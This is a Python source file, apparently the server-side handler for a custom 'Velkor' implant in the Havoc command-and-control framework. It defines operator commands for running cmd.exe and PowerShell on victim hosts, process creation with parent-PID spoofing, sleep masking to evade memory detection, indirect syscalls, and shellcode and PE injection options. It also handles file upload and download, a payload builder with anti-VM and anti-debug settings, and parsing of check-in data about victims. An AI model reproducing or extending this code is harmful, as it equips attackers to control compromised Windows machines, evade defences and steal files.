from base64 import b64decode

from Havoc.service      import HavocService
from Havoc.agent        import *
from Havoc.VelkorTasks  import *

import os

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_SHELL            = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_EXIT             = 0x155
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class TaskCmd( Command ):
    CommandId    = TASK_CMD;
    Name         = "cmd";
    Description  = "executes commands using cmd.exe";
    Help         = "aaaaaaaaaaaaaaaaaa";
    NeedAdmin   = False;
    Params      = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        ),
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        Parameter = "cmd.exe /c " + arguments["commands"];
        Task.add_data( Parameter );

        return Task.buffer;

class TaskPwsh( Command ):
    CommandId    = TASK_PWSH;
    Name         = "pwsh";
    Description  = "executes commands using powershell.exe";
    Help         = "";
    NeedAdmin   = False;
    Params      = [
        CommandParam(
            name="Commands",
            is_file_path=False,
            is_optional=False
        ),
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        Parameter = "powrshell.exe /c " + arguments["Commands"];
        Task.add_data( Parameter );

        return Task.buffer;
    
class TaskPsCreate( Command ):
    CommandId    = TASK_PROCESS;
    Name         = "run";
    Description  = "process creation";
    Help         = "";
    NeedAdmin   = False;
    Params      = [
        CommandParam(
            name="CmdLine",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        SubTaskId = TASK_SUB_PROCESS_CREATE;
        CmdLine   = arguments["CmdLine"];

        Task.add_int( SubTaskId );
        Task.add_data( CmdLine );

        return Task.buffer;
    
class TaskPsPpid( Command ):
    CommandId    = TASK_PROCESS;
    Name         = "config.fork.ppid";
    Description  = "set ppid to spoof parent process";
    Help         = "";
    NeedAdmin   = False;
    Params      = [
        CommandParam(
            name="ppid",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        SubTaskId = TASK_SUB_PROCESS_PPID;
        Ppid      = arguments["ppid"];

        Task.add_int( SubTaskId );
        Task.add_int( Ppid );

        return Task.buffer;

class TaskPsBlocks( Command ):
    CommandId    = TASK_PROCESS;
    Name         = "config.fork.blocks";
    Description  = "set parent process to block non microsoft dlls";
    Help         = "";
    NeedAdmin   = False;
    Params      = [];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        SubTaskId = TASK_SUB_PROCESS_BLOCKS;

        Task.add_int( SubTaskId );

        return Task.buffer;

class TaskSleepTime( Command ):
    CommandId    = TASK_SLEEP_TIME;
    Name         = "config.sleep.time";
    Description  = "change time to beacon sleep";
    Help         = "";
    NeedAdmin   = False; 
    Params      = [
        CommandParam(
            name="time",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        SleepTime = arguments["time"];

        Task.add_int( int( SleepTime ) );

        return Task.buffer;

class TaskSleepMask( Command ):
    CommandId    = TASK_SLEEP_MASK;
    Name         = "config.sleep.mask";
    Description  = "change sleep mask to beacon avoid detection in memory";
    Help         = "";
    NeedAdmin   = False; 
    Params      = [
        CommandParam(
            name="mask",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        SleepMaskStr = arguments["mask"];
        SleepMaskId  = 0;

        for MaskStr, MaskId in SleepMasks.items():
            if MaskStr == SleepMaskStr:  
                SleepMaskId = MaskId;
                break ;
        else:
            return;

        Task.add_int( SleepMaskId );

        return Task.buffer;

class TaskExecApi( Command ):
    CommandId    = TASK_EXEC_API;
    Name         = "config.exec";
    Description  = "change how the beacon execute apis";
    Help         = "";
    NeedAdmin   = False; 
    Params      = [
        CommandParam(
            name="method",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        ExecMethod = arguments["method"];

        Task.add_data( ExecMethod )

        return Task.buffer;

class TaskScInjection( Command ):
    CommandId    = TASK_SHELLCODE_T;
    Name         = "config.injection.shellcode";
    Description  = "change whats the technique is used to injection";
    Help         = "";
    NeedAdmin   = False; 
    Params      = [
        CommandParam(
            name="technique",
            is_file_path=False,
            is_optional=False
        )
    ];

    Mitr = [];

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate");

        Task = Packer();

        InjectionTechnique = arguments["technique"];

        Task.add_data( InjectionTechnique )

        return Task.buffer;

class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),

        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )

        return Task.buffer

class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )

        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the talon agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class Velkor( AgentType ):
    Name        = "Velkor"
    Author      = "@Oblivion"
    Version     = "0.1"
    Description = f"""Velkor agent: {Version}"""
    MagicValue  = 0x71717171

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
        {
            "Name": "Windows Dll",
            "Extension": "dll",
        },
        {
            "Name": "Windows Service Exe",
            "Extension": "exe",
        },
        {
            "Name": "Windows Raw Binary",
            "Extension": "bin",
        },
    ]

    BuildingConfig = {

        "Agent": {
            "Sleep Time"         : "15",
            "APIs Execution"     : [
                "WinAPI", "NTAPI", "Indirect Syscall"
            ],
            "Sleep Mask": [
                "WaitForSingleObject", "Timer", "APC"
            ],
            "Shellcode Injection": [
                "Classic", "Stomping"
            ],
            "PE Injection"       : [
                "Reflection", "Overloading", "Doppelganging"
            ],
            "COFF Injection"     : [
                "Classic", "Stomping"
            ]
        },

        "Loader": {
            "Injection": ShellcodeTechniques,
            "Anti-VM": {
                "Domain Joined": True,
            },
            "Anti-Debug": True,
        },

        "Debug Mode": True,
    }

    Commands = [
        TaskCmd(),
        TaskPwsh(),
        TaskExecApi(),
        # TaskScInjection(),
        TaskSleepTime(),
        TaskSleepMask(),
        TaskPsBlocks(),
        TaskPsPpid(),
        TaskPsCreate()
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function. 
    def generate( self, config: dict ) -> None:
 
        AgentConfig    :list= config["Config"]["Agent"];
        AgentArch      :str = config["Options"]["Arch"]
        ListenerConfig :list= config["Options"]["Listener"];
        DebugMode      :bool= config["Config"]["Debug Mode"];

        AgentName :str= str( self.Name + "." + AgentArch + ".bin" );
        AgentPath :str= ( "Bin/" + AgentName )

        CoffInjection  :str = "";
        PeInjection    :str = "";
        ShellInjection :str = "";
        ApiExecution   :str = "";

        SleepMask :str = ""

        for Key, Value in AgentConfig.items():
            if   Key == "COFF Injection":
                CoffInjection = Value;
            elif Key == "PE Injection":
                PeInjection = Value;
            elif Key == "Shellcode Injection":
                ShellInjection = Value;
            elif Key == "Sleep Mask":
                SleepMask = Value;
            elif Key == "APIs Execution":
                ApiExecution = Value;

        DEF_SHELLCODE, DEF_PE, DEF_COFF, DEF_SLEEPMASK, DEF_APIEXEC= (
            ShellcodeTechniques.get( ShellInjection ),
            PeTechniques.get( PeInjection ),
            CoffTechniques.get( CoffInjection ),
            SleepMasks.get( SleepMask ),
            ExecApiMethods.get( ApiExecution )
        );

        if DebugMode == True:
            DEF_DBGMODE = "on";
        else:
            DEF_DBGMODE = "off";

        DEF_SLEEPTIME = AgentConfig["Sleep Time"]
        DEF_HOSTS     = ListenerConfig["Hosts"][0];
        DEF_PORT      = int( ListenerConfig["PortBind"] );
        DEF_USERAGENT = ListenerConfig["UserAgent"];

        self.builder_send_message( config['ClientID'], "Info", f"Building Velkor agent..." );
        self.builder_send_message( config["ClientID"], "Info", f"SleepMask: {SleepMask}" );
        self.builder_send_message( config["ClientID"], "Info", f"Shellcode Injection (used for fork commands): {ShellInjection}" );
        self.builder_send_message( config["ClientID"], "Info", f"PE Injection Technique: {PeInjection}" );
        self.builder_send_message( config["ClientID"], "Info", f"COFF Injection: {CoffInjection}" );

        CommandBuild    = f"cmake -S Agent -B Agent/Build -D ARCH={AgentArch} -D DEF_APIEXEC={DEF_APIEXEC} -D DEF_DBGMODE={DEF_DBGMODE} -D DEF_SLEEPTIME={DEF_SLEEPTIME} -D DEF_SHELLCODE={DEF_SHELLCODE} -D DEF_PE={DEF_PE} -D DEF_COFF={DEF_COFF} -D DEF_SLEEPMASK={DEF_SLEEPMASK} -D DEF_HOSTS={DEF_HOSTS} -D DEF_PORT={DEF_PORT}"; #-D DEF_USERAGENT=\"{DEF_USERAGENT}\"";
        CommandExtract  = f"python3 Scripts/Extract.py -f Bin/{self.Name}.{AgentArch}.exe -o Bin/{AgentName}";

        print( CommandBuild );

        os.system( "rm -rf Agent/Build/*" )
        os.system( "rm -rf Bin/*" )
        os.system( CommandBuild );
        os.system( "cmake --build Agent/Build" );
        os.system( CommandExtract );

        self.builder_send_payload( config[ 'ClientID' ], AgentName, GetFileBytes( AgentPath ) );

    # this function handles incomming requests based on our magic value.  
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] )
        response_parser = Parser( agent_response, len( agent_response ) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:

            if Command == TASK_CODE_CHECKIN:
                print( "[*] Is agent register request" )

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_wstr(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()),
                    "OS Arch"           : response_parser.parse_int(),
                    "Sleep"             : response_parser.parse_int(),
                }

                print( f"[*] RegisterInfo: {RegisterInfo}" )

                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]

                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ]

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1: 
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2: 
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3: 
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )
                print( f"[*] RegisterInfo: {RegisterInfo}" )

                print( RegisterInfo[ "AgentID" ] )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == TASK_CODE_GETJOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command. 
                if len(Tasks) == 0:
                    Tasks = TASK_CODE_NOJOB.to_bytes( 4, 'little' )
                
                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == TASK_CODE_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == COMMAND_UPLOAD:

                FileSize = response_parser.parse_int()
                FileName = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )

            elif Command == COMMAND_DOWNLOAD:

                FileName    = response_parser.parse_str()
                FileContent = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )
                
                self.download_file( AgentID, FileName, len(FileContent), FileContent )

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''


def main():
    Havoc_Velkor = Velkor()
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    Havoc_Service.register_agent( Havoc_Velkor )

    return


if __name__ == '__main__':
    main()